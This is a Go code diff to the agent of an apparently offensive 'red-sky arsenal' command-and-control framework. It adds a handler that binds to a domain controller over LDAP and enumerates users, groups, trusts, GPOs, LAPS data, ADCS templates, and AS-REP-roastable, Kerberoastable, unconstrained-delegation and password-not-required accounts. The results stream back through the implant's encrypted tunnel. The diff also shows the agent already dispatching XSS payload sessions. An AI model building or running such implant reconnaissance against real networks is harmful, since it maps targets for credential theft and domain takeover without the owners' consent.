@@ -25,6 +25,7 @@ import (
 	"sync"
 	"time"
 
+	"github.com/sk666G/red-sky---arsenal/internal/adgo"
 	"github.com/sk666G/red-sky---arsenal/internal/agentfw"
 	"github.com/sk666G/red-sky---arsenal/internal/capturer"
 	"github.com/sk666G/red-sky---arsenal/internal/cloudgo"
@@ -297,6 +298,13 @@ func runSession(host string, port int, agentID, caFP string, beaconSec int) erro
 				continue
 			}
 			go runWebXSS(conn, sess, wx)
+		case proto.TypeAdEnumStart:
+			var ae proto.AdEnumStart
+			if err := json.Unmarshal(env.Payload, &ae); err != nil {
+				log.Printf("[adenum] unmarshal: %v", err)
+				continue
+			}
+			go runAdEnum(conn, sess, ae)
 		case proto.TypeWirelessStop:
 			var ws proto.WirelessStop
 			if err := json.Unmarshal(env.Payload, &ws); err != nil {
@@ -1662,4 +1670,137 @@ func runWebXSS(conn net.Conn, sess *crypto.Session, wx proto.WebXSSStart) {
 		send("payload", p.Context, p.Label, webgo.RenderXSSPayload(p, js), p.Notes)
 	}
 	send("done", "", "", "", "")
+}
+
+// runAdEnum runs one LDAP enumeration against the DC.
+func runAdEnum(conn net.Conn, sess *crypto.Session, ae proto.AdEnumStart) {
+	sendEntry := func(e adgo.LDAPEntry) {
+		sendTunnelAck(conn, sess, proto.TypeAdEnumData, proto.AdEnumData{
+			SessionID: ae.SessionID,
+			Action:    ae.Action,
+			DN:        e.DN,
+			Attrs:     e.Attrs,
+			OK:        true,
+		})
+	}
+	sendMsg := func(msg string, ok, done bool) {
+		sendTunnelAck(conn, sess, proto.TypeAdEnumData, proto.AdEnumData{
+			SessionID: ae.SessionID,
+			Action:    ae.Action,
+			Message:   msg,
+			OK:        ok,
+			Done:      done,
+		})
+	}
+
+	opts := adgo.LDAPOptions{
+		Host:   ae.Host,
+		Port:   ae.Port,
+		TLS:    ae.UseTLS,
+		BindDN: ae.BindDN,
+		BindPW: ae.BindPW,
+	}
+	c, err := adgo.Dial(opts)
+	if err != nil {
+		sendMsg("dial: "+err.Error(), false, true)
+		return
+	}
+	defer c.Close()
+	if err := c.Bind(); err != nil {
+		sendMsg("bind: "+err.Error(), false, true)
+		return
+	}
+
+	base := ae.BaseDN
+	if base == "" {
+		base, err = adgo.RootDSE(context.Background(), c)
+		if err != nil {
+			sendMsg("rootdse: "+err.Error(), false, true)
+			return
+		}
+	}
+	sendMsg("baseDN="+base, true, false)
+
+	switch ae.Action {
+	case "rootdse":
+		sendMsg("baseDN="+base, true, false)
+	case "domain":
+		if e, err := adgo.DomainInfo(base, c); err == nil {
+			sendEntry(e)
+		} else {
+			sendMsg(err.Error(), false, false)
+		}
+	case "users":
+		if entries, err := adgo.EnumerateUsers(base, c); err == nil {
+			for _, e := range entries {
+				sendEntry(e)
+			}
+		}
+	case "groups":
+		if entries, err := adgo.EnumerateGroups(base, c); err == nil {
+			for _, e := range entries {
+				sendEntry(e)
+			}
+		}
+	case "computers":
+		if entries, err := adgo.EnumerateComputers(base, c); err == nil {
+			for _, e := range entries {
+				sendEntry(e)
+			}
+		}
+	case "gpos":
+		if entries, err := adgo.EnumerateGPOs(base, c); err == nil {
+			for _, e := range entries {
+				sendEntry(e)
+			}
+		}
+	case "trusts":
+		if entries, err := adgo.EnumerateTrusts(base, c); err == nil {
+			for _, e := range entries {
+				sendEntry(e)
+			}
+		}
+	case "asrep":
+		if entries, err := adgo.EnumerateASREPRoastable(base, c); err == nil {
+			for _, e := range entries {
+				sendEntry(e)
+			}
+		}
+	case "kerberoast":
+		if entries, err := adgo.EnumerateKerberoastable(base, c); err == nil {
+			for _, e := range entries {
+				sendEntry(e)
+			}
+		}
+	case "unconstrained":
+		if entries, err := adgo.EnumerateUnconstrainedDelegation(base, c); err == nil {
+			for _, e := range entries {
+				sendEntry(e)
+			}
+		}
+	case "pwdnotreq":
+		if entries, err := adgo.EnumeratePasswordNotRequired(base, c); err == nil {
+			for _, e := range entries {
+				sendEntry(e)
+			}
+		}
+	case "laps":
+		if entries, err := adgo.EnumerateLAPS(base, c); err == nil {
+			for _, e := range entries {
+				sendEntry(e)
+			}
+		}
+	case "adcs":
+		cas, tpls, _ := adgo.EnumerateADCS(base, c)
+		for _, e := range cas {
+			sendEntry(e)
+		}
+		for _, e := range tpls {
+			sendEntry(e)
+		}
+	default:
+		sendMsg("unknown ad action: "+ae.Action, false, true)
+		return
+	}
+	sendMsg("", true, true)
 }
